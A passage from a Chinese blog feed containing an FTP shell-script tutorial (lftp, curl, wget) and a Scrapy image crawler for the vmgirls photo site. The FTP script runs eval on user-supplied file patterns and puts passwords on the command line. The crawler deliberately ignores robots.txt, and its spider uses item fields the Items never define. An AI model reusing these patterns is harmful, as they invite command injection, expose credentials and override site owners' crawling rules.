server都会设置账户密码，那么使用<code>lftp</code>该如何完成认证呢？其中在上面的示例中已经给出答案了，就是通过参数<code>-u</code>指定。</p><pre><code class="bash">lftp -u &quot;$ftp_user,$ftp_pass&quot;</code></pre><p>如果将密码存储在某个文件<code>~/local/etc/ftp_pass</code>，那么可以在脚本中使用一个函数进行获取。</p><pre><code class="bash"> get_ftp_pass() &#123;     pass_file=$HOME/local/etc/ftp_pass     [ -f $pass_file ] &amp;&amp; ftp_pass=$(cat $pass_file)     test -z &quot;$ftp_pass&quot; \         &amp;&amp; read -rs -p &quot;Please input password of your FTP user $ftp_user: &quot; ftp_pass &#125;</code></pre><h2 id="通用操作"><a href="#通用操作" class="headerlink" title="通用操作"></a>通用操作</h2><p>如果完全使用<code>lftp</code>完成ftp传输的各个功能，那么可以在<code>shell</code>脚本中使用以下模板完成各个指令操作：</p><pre><code class="bash">lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF    COMMAND1 [Args1]    COMMAND2 [Args2]EOF</code></pre><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>由于文件上传是将本地文件传输至ftp server，那么通常情况不需要正则匹配，本地文件选择通过shell的tab自动补全即可做到。</p><p>使用<code>lftp</code>的<code>put $file -o $remotefile</code>可将本地文件<code>$file</code>传输至ftp server并重命名为<code>$remotefile</code>，<code>-o</code>参数用于指定server端的文件名。</p><pre><code class="bash">ftp_put_file()&#123;    get_ftp_pass    prefix=$(date &#39;+%Y%m%d%H%M%S-&#39;)    remotefile=$&#123;prefix&#125;$&#123;file##*/&#125;    subdir=$(date &#39;+%Y%m%d&#39;)    lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF             mkdir -p -f $subdir         cd $subdir &amp;&amp; put $&#123;file##*/&#125; -o $&#123;remotefile&#125;     EOF&#125;</code></pre><p>如上代码所示，当我们想要<strong>将文件传输至服务端子目录</strong>时，需要通过<code>mkdir</code>和<code>cd</code>指令完成目录的创建和切换。在本例中，我们将每次上传的文件都放置在了以当天日期命名所在的文件夹，并给原有文件名加上了时间戳前缀。</p><p>此处需要普及两个知识点：</p><ul><li>shell中的变量切割</li></ul><blockquote><p><strong>变量切割</strong></p><p><code>#</code> 删除变量左侧的最短匹配；<code>##</code> 删除变量左侧的最长匹配</p><p><code>%</code> 删除变量右侧的最短匹配；<code>%%</code>删除变量右侧的最长匹配</p><p>${file##*/} 以<code>/</code>为分隔符，删除最后一个<code>/</code>往左的所有字符，此处用于获取文件名</p><p>${file%/*} 以<code>/</code>为分隔符，删除最后一个<code>/</code>往右的所有字符，此处用于获取目录</p></blockquote><p>我们通常在脚本中使用<code>$&#123;0##*/&#125;</code>获取当前执行指令的文件名。</p><ul><li><code>&lt;&lt;-EOF</code>语法</li></ul><pre><code class="bash">**man bash**[n]&lt;&lt;[-]word        here-documentdelimiter......If the redirection operator is `&lt;&lt;-`, then all leading tab characters are stripped from input lines and the line  containing  delimiter.   This  allows  here-documents within shell scripts to be indented in a natural fashion.</code></pre><p>简单点说，<code>&lt;&lt;-EOF</code>中的连接符<code>-</code>保证下面语句中的每行开头的<code>tab</code>分隔符会被忽略，但又可以保证代码的自然美观。如果下面语句中开头的<code>tab</code>键是空格替换的，那么有可能会报语法错误，这也是需要注意的。</p><h2 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h2><p>文件下载是本文重点，因为我们将完成ftp服务器端文件的模糊匹配下载。在讲述模糊匹配下载之前，先讲讲使用<code>lftp</code>实现下载的方法。</p><pre><code class="bash">ftp_get_file()&#123;    get_ftp_pass    if test &quot;$&#123;file%/*&#125;&quot; = &quot;$&#123;file&#125;&quot;; then        lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF            set xfer:clobber on            get $&#123;file&#125;        EOF    else        lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF            set xfer:clobber on            cd $&#123;file%/*&#125; &amp;&amp; get $&#123;file##*/&#125;        EOF    fi&#125;</code></pre><p>以上实现中，分带有子目录和不带子目录两种情况，指令<code>set xfer:clobber on</code>是为了解决重复下载时提示文件已存在的问题。这种方法简单，但是每次只能下载一个确切名称的文件。</p><p>好了，接下来介绍能够实现模糊匹配及批量下载的方法，思路其实很简单：</p><ol><li>从给定的文件路径中解析出<strong>目录</strong>以及符合正则表达式的<strong>文件名</strong></li><li>使用<code>curl</code>指令下载指定<code>ftp</code>目录，得到指定目录的<strong>文件列表信息</strong></li><li>对列表信息使用<code>awk</code>, <code>grep</code>指令完成正则模糊匹配，获取真实文件路径</li><li>使用<code>wget</code>指令批量下载匹配到的文件</li></ol><p>根据这个思路编写代码如下：</p><pre><code class="bash">ftp_get_file()&#123;    get_ftp_pass    # get subdir and regex pattern of filenames    result=$(echo &quot;$file&quot; |grep &quot;/&quot;)    if [ &quot;x$result&quot; != &quot;x&quot; ]; then        # split file to directory and re pattern of files        subdir=$&#123;file%/*&#125;/        re_pattern=$&#123;file##*/&#125;    else        subdir=&quot;/&quot;        re_pattern=$file    fi    # 1. curl get file list    files=$(curl -s -u $&#123;ftp_user&#125;:$&#123;ftp_pass&#125; $&#123;ftp_host&#125;/$&#123;subdir&#125;)    [ $? -eq 67 ] &amp;&amp; echo &quot;curl: password error!&quot; &amp;&amp; exit 2    # 2. grep with regex to get files which need download    files=$(echo &quot;$files&quot; |awk &#39;&#123;print $4&#125;&#39; |grep &quot;$&#123;re_pattern&#125;&quot;)    [ &quot;x$files&quot; = &quot;x&quot; ] &amp;&amp; echo &quot;Not Found Files&quot; &amp;&amp; exit 3    file_nums=$(echo &quot;$files&quot; |wc -l)    [ ! $file_nums -eq 1 ] &amp;&amp; &#123;        files=$(echo &quot;$files&quot; |xargs)        files=&quot;&#123;$&#123;files//\ /,&#125;&#125;&quot;    &#125;    # 3. wget files    eval wget --ftp-user=$&#123;ftp_user&#125; --ftp-password=$&#123;ftp_pass&#125; $&#123;ftp_host&#125;/$&#123;subdir&#125;$&#123;files&#125; -nv&#125;</code></pre><p>首先从带有模糊匹配的文件名中分隔出远程目录及文件名的正则表达式，然后根据预定的思路逐步完成文件匹配及下载。这里需要注意的几个问题有：</p><ol><li><code>curl</code>及<code>wget</code>有各自的认证参数：<ul><li><code>curl -u %&#123;ftp_user&#125;:$&#123;ftp_pass&#125;</code></li><li><code>wget --ftp-user=$&#123;ftp_user&#125; --ftp_password=$&#123;ftp_pass&#125;</code></li></ul></li><li>当只匹配到一个文件时，文件名不能使用<code>&#123;&#125;</code>包含在一起，所以代码中使用了<code>wc -l</code>统计匹配到的文件数</li><li>对于包含换行符的变量<code>$files</code>，在用<code>echo</code>打印时需加上双引号<code>&quot;$files&quot;</code>，否则换行符会自动变为空格</li><li>shell中的变量可以进行字符替换，<code>$&#123;files//\ /,&#125;</code>就是将<code>$files</code>变量中的所有空格替换成了逗号<ul><li><code>//</code>替换所有匹配项</li><li><code>/</code>仅仅替换第一个匹配项</li></ul></li></ol><h2 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h2><p>对于文件删除，由于使用较少，所以没有对其实现模糊匹配，当然想要实现也是可以的。这里仅给出最基本的删除方式：</p><pre><code class="bash">ftp_del_file()&#123;    get_ftp_pass    if test &quot;$&#123;file%/*&#125;&quot; = &quot;$&#123;file&#125;&quot;; then        lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF            rm -rf $&#123;file&#125;        EOF    else        lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF            cd $&#123;file%/*&#125; &amp;&amp; rm -rf $&#123;file##*/&#125;        EOF    fi&#125;</code></pre><p>到此，常见的ftp操作都已经介绍完了。</p><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><p>完整代码<code>fctl</code>如下：</p><pre><code class="bash">#!/bin/bashcmd=&quot;$&#123;0##*/&#125;&quot;ftp_host=&quot;ftp://127.0.0.1&quot;test -z &quot;$ftp_user&quot; &amp;&amp; ftp_user=&quot;$&#123;USER&#125;&quot;#usage()#&#123;#  cat &lt;&lt;-EOF &gt;&amp;2#  Usage: fput &lt;file&gt;#         fget &lt;file/dir&gt;#         fdel &lt;file/dir&gt;#  EOF#&#125;get_ftp_pass()&#123;    pass_file=$HOME/local/etc/ftp_pass    [ -f $pass_file ] &amp;&amp; ftp_pass=$(cat $pass_file)    test -z &quot;$ftp_pass&quot; \        &amp;&amp; read -rs -p &quot;Please input password of your FTP user $ftp_user: &quot; ftp_pass&#125;ftp_put_file()&#123;    get_ftp_pass    prefix=$(date &#39;+%Y%m%d%H%M%S-&#39;)    remotefile=$&#123;prefix&#125;$&#123;file##*/&#125;    subdir=$(date &#39;+%Y%m%d&#39;)    if test -z &quot;$subdir&quot;; then        lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF            put $&#123;file##*/&#125; -o $&#123;remotefile&#125;        EOF    else        lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF            mkdir -p -f $subdir            cd $subdir &amp;&amp; put $&#123;file##*/&#125; -o $&#123;remotefile&#125;        EOF    fi&#125;ftp_get_file()&#123;    get_ftp_pass    result=$(echo &quot;$file&quot; |grep &quot;/&quot;)    if [ &quot;x$result&quot; != &quot;x&quot; ]; then        # split file to directory and re pattern of files        subdir=$&#123;file%/*&#125;/        re_pattern=$&#123;file##*/&#125;    else        subdir=&quot;/&quot;        re_pattern=$file    fi    # 1. curl get file list    files=$(curl -s -u $&#123;ftp_user&#125;:$&#123;ftp_pass&#125; $&#123;ftp_host&#125;/$&#123;subdir&#125;)    [ $? -eq 67 ] &amp;&amp; echo &quot;curl: password error!&quot; &amp;&amp; exit 2    # 2. grep with regex to get files which need download    files=$(echo &quot;$files&quot; |awk &#39;&#123;print $4&#125;&#39; |grep &quot;$&#123;re_pattern&#125;&quot;)    [ &quot;x$files&quot; = &quot;x&quot; ] &amp;&amp; echo &quot;Not Found Files&quot; &amp;&amp; exit 3    file_nums=$(echo &quot;$files&quot; |wc -l)    [ ! $file_nums -eq 1 ] &amp;&amp; &#123;        files=$(echo &quot;$files&quot; |xargs)        files=&quot;&#123;$&#123;files//\ /,&#125;&#125;&quot;    &#125;    # 3. wget files    eval wget --ftp-user=$&#123;ftp_user&#125; --ftp-password=$&#123;ftp_pass&#125; $&#123;ftp_host&#125;/$&#123;subdir&#125;$&#123;files&#125; -nv&#125;ftp_del_file()&#123;    get_ftp_pass    if test &quot;$&#123;file%/*&#125;&quot; = &quot;$&#123;file&#125;&quot;; then        lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF            rm -rf $&#123;file&#125;        EOF    else        lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF            cd $&#123;file%/*&#125; &amp;&amp; rm -rf $&#123;file##*/&#125;        EOF    fi&#125;case &quot;$cmd&quot; in    &quot;fput&quot;)        file=&quot;$&#123;1:?missing arg 1 to specify file path!!!&#125;&quot;        cd &quot;$(dirname $(readlink -f $file))&quot; &amp;&amp; ftp_put_file ;;    &quot;fget&quot;)        file=&quot;$&#123;1:?missing arg 1 to specify file path!!!&#125;&quot;        ftp_get_file ;;    &quot;fdel&quot;)        file=&quot;$&#123;1:?missing arg 1 to specify file path!!!&#125;&quot;        ftp_del_file ;;esac</code></pre><h2 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h2><p>使用<code>ln -s</code>创建<code>fput</code>,<code>fget</code>,<code>fdel</code>三个软链接，便可通过这三个别名完成对应的上传、下载和删除操作了。</p><ul><li>fput</li></ul><pre><code class="bash">fput test # test文件将存放至server当天目录，并冠以时间戳为文件名前缀fput ~/bin/fget  # fget文件将存放至server当天目录，并冠以时间戳为文件名前缀</code></pre><ul><li>fget</li></ul><pre><code class="bash">fget 20190902/ # 获取服务器端20190902目录下所有文件fget 20190902/2019 # 获取服务器端20190902目录下包含2019字符的所有文件fget test # 获取服务器端根目录下包含test子串的所有文件fget te.*st # 获取服务器端根目录下符合匹配符的所有文件，如test,teast,teost,teeest</code></pre><ul><li>fdel</li></ul><pre><code class="bash">fdel test # 删除服务器端根目录名为test的文件fdel docs/test # 删除服务器端docs目录下名为test的文件</code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://man.linuxde.net/lftp">lftp命令</a></li><li><a href="https://www.cnblogs.com/gx-303841541/archive/2012/10/25/2738048.html">shell 字符串分割与连接</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
            <tag> ftp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python网络爬虫6 - Scrapy爬取vmgirls</title>
      <link href="2019/08/09/vmgirls/"/>
      <url>2019/08/09/vmgirls/</url>
      
        <content type="html"><![CDATA[<p>今天介绍一个妹子站点图片的爬取过程，站点<a href="https://www.vmgirls.com/">唯美女生</a>。站点结构非常简单，单独用<code>requests</code>库或者<code>scrapy</code>框架都可以。本文介绍的是使用<code>scrapy</code>框架爬取。</p><p><img src="/assets/vmgirls/vmgirls.png" alt="vmgirls"></p><span id="more"></span><h2 id="分析vmgirls站点"><a href="#分析vmgirls站点" class="headerlink" title="分析vmgirls站点"></a>分析vmgirls站点</h2><p>站点做的非常清新唯美，结构简洁明了，主页的主体部分以卡片形式展示各个主题的缩略图和简要介绍，但主页并不适合直接爬取。</p><p><img src="/assets/vmgirls/home.png" alt="vmgirls home page"></p><p>不过幸好该站点已经提供了站点地图，对于这种相对简单的网站，使用现成的网站地图简直事半功倍。</p><p><img src="/assets/vmgirls/sitemap.png" alt="sitemap"></p><p>那么思路就很清楚了，首先通过站点地图获取所有主题页面的网址和标题，然后逐个爬取妹子页面，提取所有的图片<code>url</code>，然后下载到本地，每个主题页面的图片单独存放到一个文件夹中。</p><h3 id="站点地图"><a href="#站点地图" class="headerlink" title="站点地图"></a>站点地图</h3><p>本站点提供了两个站点地图：</p><ol><li><a href="https://www.vmgirls.com/sitemap.shtml">https://www.vmgirls.com/sitemap.shtml</a></li><li><a href="https://www.vmgirls.com/sitemap.xml">https://www.vmgirls.com/sitemap.xml</a></li></ol><p>第1个是面向用户的站点地图，从主页的导航栏就能找到；第2个（如下图）则是常规网站留给搜索引擎的站点地图，文件格式也是常规的<code>xml</code></p><p><img src="/assets/vmgirls/sitemap_xml.png" alt="sitemap.xml"></p><p>我使用<code>wget</code>指令获取两个文件，并进行了对比，发现<code>sitemap.xml</code>仅仅包含1000个网址，但是可视的站点地图包含1163个网址。说明留给搜索引擎的地图并不完整，而且相比较之下，<code>sitemap.shtml</code>所占的文件大小要比<code>sitemap.xml</code>还要小，这是因为<code>sitemap.xml</code>因其格式问题，带有大量重复信息。</p><pre><code class="bash">➜  tmp ls -lhtotal 320K-rw-r--r-- 1 litreily litreily 132K 8月  26 17:25 sitemap.shtml-rw-r--r-- 1 litreily litreily 186K 8月  26 20:44 sitemap.xml</code></pre><p>所以，不管是考虑完整性，还是文件大小，我们都有理由选择<code>sitemap.shtml</code>作为爬取的第一个网页。</p><p>下面来看看站点地图的html结构：</p><p><img src="/assets/vmgirls/sitemap_struct.png" alt="sitemap structure"></p><p>使用<code>wget</code>获取该网页，截取其中一段列表信息如下：</p><pre><code class="html">&lt;h2 style=&quot;text-align: center; margin-top: 20px&quot;&gt;唯美女生站点地图&lt;/h2&gt;&lt;center&gt;&lt;/center&gt;&lt;div id=&quot;nav&quot;&gt;&lt;a href=&quot;https://www.vmgirls.com/&quot;&gt;&lt;strong&gt;唯美女生&lt;/strong&gt;&lt;/a&gt; » &lt;a href=&quot;https://www.vmgirls.com/sitemap.shtml&quot;&gt;站点地图&lt;/a&gt;&lt;/div&gt;&lt;div id=&quot;content&quot;&gt;&lt;h3&gt;最新文章&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.vmgirls.com/12530.html&quot; title=&quot;倦怠&quot; target=&quot;_blank&quot;&gt;倦怠&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.vmgirls.com/12517.html&quot; title=&quot;逆光&quot; target=&quot;_blank&quot;&gt;逆光&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.vmgirls.com/12507.html&quot; title=&quot;回眸&quot; target=&quot;_blank&quot;&gt;回眸&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.vmgirls.com/12487.html&quot; title=&quot;早安，乖乖&quot; target=&quot;_blank&quot;&gt;早安，乖乖&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.vmgirls.com/12477.html&quot; title=&quot;你眼里有我&quot; target=&quot;_blank&quot;&gt;你眼里有我&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.vmgirls.com/12476.html&quot; title=&quot;夏日限定&quot; target=&quot;_blank&quot;&gt;夏日限定&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.vmgirls.com/12419.html&quot; title=&quot;你眼睛一闪一闪的&quot; target=&quot;_blank&quot;&gt;你眼睛一闪一闪的&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.vmgirls.com/12405.html&quot; title=&quot;夏天你的甜&quot; target=&quot;_blank&quot;&gt;夏天你的甜&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.vmgirls.com/12386.html&quot; title=&quot;无尽夏&quot; target=&quot;_blank&quot;&gt;无尽夏&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.vmgirls.com/12353.html&quot; title=&quot;Halcyon&quot; target=&quot;_blank&quot;&gt;Halcyon&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.vmgirls.com/12333.html&quot; title=&quot;少女情怀&quot; target=&quot;_blank&quot;&gt;少女情怀&lt;/a&gt;&lt;/li&gt;</code></pre><p>从上图可以看出，网页网址以<code>&lt;li&gt;</code>列表形式存储，网页解析时使用以下xpath表达式即可获取到所有的网址和标题。</p><pre><code class="python"># example:# &lt;li&gt;&lt;a href=&quot;https://www.vmgirls.com/12419.html&quot; title=&quot;你眼睛一闪一闪的&quot; target=&quot;_blank&quot;&gt;你眼睛一闪一闪的&lt;/a&gt;&lt;/li&gt;urls = response.xpath(&#39;//*[@id=&quot;content&quot;][1]/ul/li/a/@href&#39;).extract()titles = response.xpath(&#39;//*[@id=&quot;content&quot;][1]/ul/li/a/text()&#39;).extract()</code></pre><p>据此，我们便拿到了所有页面的网址和标题，下面针对单个主题页面进行解析。</p><h3 id="单个主题页面"><a href="#单个主题页面" class="headerlink" title="单个主题页面"></a>单个主题页面</h3><p><img src="/assets/vmgirls/theme.png" alt="single theme"></p><p>针对单个主题页面，使用<code>Chrome</code>调试工具可以看到图片链接的<code>DOM</code>结构，但是要注意的是，调试工具看到的和实际wget获取到的不太一样，我猜测是在浏览器上显示时执行了某些额外的JS脚本。不管怎么样，当然是要以爬取后的实际数据为准，如下信息所示，img标签的<code>src</code>属性与上图中的不一样，所以我们在解析时不能使用这个属性，但是<code>data-src</code>则是相同的。</p><pre><code class="html">&lt;div class=&quot;post-content&quot;&gt;&lt;div class=&quot;nc-light-gallery&quot;&gt;&lt;p&gt;◎摄影/后期：@萌琦琦M77&lt;br&gt; – – – – – – – –&lt;br&gt; 你的眼睛里好像有闪闪的星星坠落。&lt;br&gt;&lt;a href=&quot;https://static.vmgirls.com/image/2019/07/2019-07-18_00-53-58.jpg&quot; alt=&quot;你眼睛一闪一闪的&quot; title=&quot;你眼睛一闪一闪的&quot;&gt;&lt;img alt=&quot;你眼睛一闪一闪的-唯美女生&quot; src=&quot;data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7&quot; data-src=&quot;https://static.vmgirls.com/image/2019/07/2019-07-18_00-53-58.jpg&quot; data-nclazyload=&quot;true&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://static.vmgirls.com/image/2019/07/2019-07-18_00-54-01.jpg&quot; alt=&quot;你眼睛一闪一闪的&quot; title=&quot;你眼睛一闪一闪的&quot;&gt;&lt;img alt=&quot;你眼睛一闪一闪的-唯美女生&quot; src=&quot;data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7&quot; data-src=&quot;https://static.vmgirls.com/image/2019/07/2019-07-18_00-54-01.jpg&quot; data-nclazyload=&quot;true&quot;&gt;&lt;/a&gt;</code></pre><p>由上面的分析可以确定出以下解析方式，以获取到当前页面所有图片的下载链接。</p><pre><code class="python">urls = response.xpath(&#39;//*[@class=&quot;post-content&quot;]//img/@data-src&#39;).extract()</code></pre><p>至此，单个页面的解析思路也清楚了，之后通过<code>Scrapy</code>的<code>ImagesPipeline</code>即可完成图片下载。</p><h2 id="爬虫的代码实现"><a href="#爬虫的代码实现" class="headerlink" title="爬虫的代码实现"></a>爬虫的代码实现</h2><h3 id="创建scrapy项目"><a href="#创建scrapy项目" class="headerlink" title="创建scrapy项目"></a>创建scrapy项目</h3><pre><code class="bash">$ scrapy startproject vmgirls$ cd vmgirls$ scrapy genspider vmgirl www.vmgirls.com$ tree.├── scrapy.cfg└── vmgirl    ├── __init__.py    ├── items.py    ├── middlewares.py    ├── pipelines.py    ├── settings.py    └── spiders        ├── __init__.py        └── vmgirl.py</code></pre><h3 id="全局配置"><a href="#全局配置" class="headerlink" title="全局配置"></a>全局配置</h3><p>编辑settings.py</p><pre><code class="python">BOT_NAME = &#39;vmgirls&#39;SPIDER_MODULES = [&#39;vmgirls.spiders&#39;]NEWSPIDER_MODULE = &#39;vmgirls.spiders&#39;import osUSER_DIR = os.path.expanduser(&#39;~&#39;)USER_DATA_DIR = os.path.join(USER_DIR, &#39;Pictures/python/vmgirls&#39;)IMAGES_STORE = USER_DATA_DIR# Obey robots.txt rulesROBOTSTXT_OBEY = False# Configure item pipelines# See https://doc.scrapy.org/en/latest/topics/item-pipeline.htmlITEM_PIPELINES = &#123;    &#39;vmgirls.pipelines.VmgirlsPipeline&#39;: 300,    &#39;vmgirls.pipelines.VmgirlsImagesPipeline&#39;: 400&#125;</code></pre><p>如上代码所示，全局配置文件主要定义了文件存储路径<code>IMAGES_STORE</code>, 禁止遵守robots.txt, 启用两个Pipeline并设置其优先级。</p><h3 id="定义Item"><a href="#定义Item" class="headerlink" title="定义Item"></a>定义Item</h3><p>接下来定义两个Item类，<code>VmgirlsItem</code>用于存储主题页面的网址及其标题，<code>VmgirlsImagesItem</code>用于存储单个主题页面内所有图片的地址和主题的标题。这两个类的title内容是一致的。</p><pre><code class="python">from scrapy.item import Itemfrom scrapy.item import Fieldclass VmgirlsItem(Item):    # define the fields for your item here like:    # name = scrapy.Field()    url = Field()    title = Field()    passclass VmgirlsImagesItem(Item):    image_urls = Field()    title = Field()    pass</code></pre><h3 id="编写爬虫"><a href="#编写爬虫" class="headerlink" title="编写爬虫"></a>编写爬虫</h3><p>爬虫当然是最关键的一步，爬取思路与开始提及的站点分析思路一致，先爬取站点地图，然后在解析函数<code>parse</code>中获取所有主题页面的网址和标题，并通过<code>VmgirlsItem</code>提交到项目管道；与此同时，将爬取到的主题页面提交给引擎，由引擎把需求转给调度器和下载器；这一步爬取的结果由新的解析函数<code>parse_page</code>处理。</p><p>解析函数<code>parse_page</code>会将每个主题页面的图片链接和标题提取出来，然后提交给项目管道，由pipeline部分完成图片下载操作。</p><pre><code class="python">import scrapyfrom vmgirls.items import VmgirlsItemfrom vmgirls.items import VmgirlsImagesItemfrom scrapy.http import Requestfrom scrapy.utils.project import get_project_settingsimport osclass VmgirlSpider(scrapy.Spider):    name = &#39;vmgirl&#39;    allowed_domains = [&#39;vmgirls.com&#39;]    start_urls = [&#39;https://www.vmgirls.com/sitemap.shtml/&#39;]    def __init__(self):        settings = get_project_settings()        self.user_data_dir = settings.get(&#39;USER_DATA_DIR&#39;)    def parse(self, response):        &#39;&#39;&#39;Parse sitemap&#39;&#39;&#39;        urls = response.xpath(&#39;//*[@id=&quot;content&quot;][1]/ul/li/a/@href&#39;).extract()        titles = response.xpath(&#39;//*[@id=&quot;content&quot;][1]/ul/li/a/text()&#39;).extract()        item = VmgirlsItem()        item[&#39;theme_urls&#39;] = urls        item[&#39;theme_titles&#39;] = titles        yield item        for url, title in zip(urls, titles):            save_path = os.path.join(self.user_data_dir, title)            if not os.path.isdir(save_path):                os.makedirs(save_path)            yield Request(url, meta=&#123;&#39;title&#39;: title&#125;, callback=self.parse_page)    def parse_page(self, response):        &#39;&#39;&#39;Parse each page of girls&#39;&#39;&#39;        urls = response.xpath(&#39;//*[@class=&quot;post-content&quot;]//img/@data-src&#39;).extract()        item = VmgirlsImagesItem()        item[&#39;image_urls&#39;] = urls        item[&#39;title&#39;] = response.meta[&#39;title&#39;]        yield item</code></pre><h3 id="编写Pipeline"><a href="#编写Pipeline" class="headerlink" title="编写Pipeline"></a>编写Pipeline</h3><p>爬虫爬取的信息最终通过项目管道进行持久化处理或者完成相应的资源下载任务，从之前的配置文件我们也能知道，我们需要两个<code>pipeline</code>类，一个处理<code>VmgirlsItem</code>,另一个处理<code>VmgirlsImagesPipeline</code>，下面逐一介绍。</p><pre><code class="python">from scrapy.exporters import JsonLinesItemExporterfrom scrapy.pipelines.images import ImagesPipelinefrom scrapy.exceptions import DropItemfrom scrapy.http import Requestfrom vmgirls.items import VmgirlsItemfrom vmgirls.items import VmgirlsImagesItemimport osclass VmgirlsPipeline(object):    &#39;&#39;&#39;Pipeline for every url of one theme, save theme info to json file&#39;&#39;&#39;    def __init__(self, user_data_dir):        &#39;&#39;&#39;Open file to save the exported Items&#39;&#39;&#39;        self.user_data_dir = user_data_dir        if not os.path.isdir(self.user_data_dir):            os.makedirs(self.user_data_dir)    @classmethod    def from_crawler(cls, crawler):        &#39;&#39;&#39;Get user dir from global settings.py&#39;&#39;&#39;        settings = crawler.settings        return cls(settings.get(&#39;USER_DATA_DIR&#39;))    def process_item(self, item, spider):        &#39;&#39;&#39;Save item info to loacl file&#39;&#39;&#39;        if isinstance(item, VmgirlsItem):            self.girls_info = open(                os.path.join(self.user_data_dir, &#39;vmgirls.json&#39;), &#39;w+b&#39;)            self.girls_exporter = JsonLinesItemExporter(                self.girls_info, encoding=&#39;utf-8&#39;, indent=4)            self.girls_exporter.start_exporting()            for url, title in zip(item[&#39;theme_urls&#39;], item[&#39;theme_titles&#39;]):                single_item = &#123;&#39;theme_url&#39;:url, &#39;title&#39;:title&#125;                self.girls_exporter.export_item(single_item)            self.girls_exporter.finish_exporting()            self.girls_info.close()        return item</code></pre><p>第一个<code>pipeline</code>类将站点地图的信息以<code>json</code>格式存储到文件<code>vmgirls.json</code>中。这里用到了<code>JsonLinesItemExporter</code>,该类可以将一个个<code>dict</code>数据以单行形式转化成json格式。</p><pre><code class="python">class VmgirlsImagesPipeline(ImagesPipeline):    &#39;&#39;&#39;Get images from one theme&#39;&#39;&#39;    def get_media_requests(self, item, info):        if isinstance(item, VmgirlsImagesItem):            for image_url in item[&#39;image_urls&#39;]:                yield Request(image_url, meta=&#123;&#39;item&#39;: item&#125;)    def file_path(self, request, response=None, info=None):        &#39;&#39;&#39;Set image dir to IMAGES_STORE/title/base_url&#39;&#39;&#39;        url = request.url        item = request.meta[&#39;item&#39;]        path = os.path.join(item[&#39;title&#39;], url.split(&#39;/&#39;)[-1])        return path    def item_completed(self, results, item, info):        if isinstance(item, VmgirlsImagesItem):            image_paths = [x[&#39;path&#39;] for ok, x in results if ok]            if not image_paths:                raise DropItem(&quot;Item contains no images&quot;)            return item</code></pre><p>第二个<code>pipeline</code>类继承于<code>ImagesPipeline</code>，这是一个专门用于图片下载的管道类，配置文件中的<code>IMAGES_STORE</code>正是用于指定该类下载图片后的存放路径。</p><p>我们这里重写了三个函数：</p><ol><li><code>get_media_requests</code> 获取某主题页面的所有图片链接，使用<code>Request</code>进行下载</li><li><code>file_path</code> 为了将不同主题的图片存储在不同的文件夹，需要修改存储路径</li><li><code>item_completed</code> 当图片下载完成后，进入该函数，如果没有下载到图片则提示该<code>Item</code>不包含图片</li></ol><p>可以注意到，两个管道类在处理<code>item</code>前都有通过<code>isinstance</code>函数判断当前的<code>pipeline</code>属于哪个类的实例，这是为了保证一个管道类只处理对应的管道数据。因为默认情况下，爬虫提交出来的所有<code>item</code>都会根据<code>pipeline</code>的优先级依次经过两个管道，但我们实际只需要每个<code>item</code>经过对应的管道即可，所以使用<code>isinstance</code>进行判断是非常有必要的，既可以提高处理效率，又可以避免过多无效log对调试过程产生的干扰。</p><h2 id="爬取结果"><a href="#爬取结果" class="headerlink" title="爬取结果"></a>爬取结果</h2><p>为了方便爬取，可以使用以下的代码段作为爬虫的入口。</p><pre><code class="python">from scrapy import cmdlinecmdline.execute(&#39;scrapy crawl vmgirl&#39;.split())</code></pre><p>执行后可以看到爬虫到的图片数据如下：</p><p><img src="/assets/vmgirls/pictures.png" alt="capture result"></p><p>代码已托管至开源项目<a href="https://github.com/Litreily/capturer">litreily/capturer</a>, 欢迎Star和交流。</p>]]></content>
      
      
      <categories>
          
          <category> Language </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> spider </tag>
            
            <tag> girls </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高效思维导图应用训练</title>
      <link href="2019/06/11/mind-map/"/>
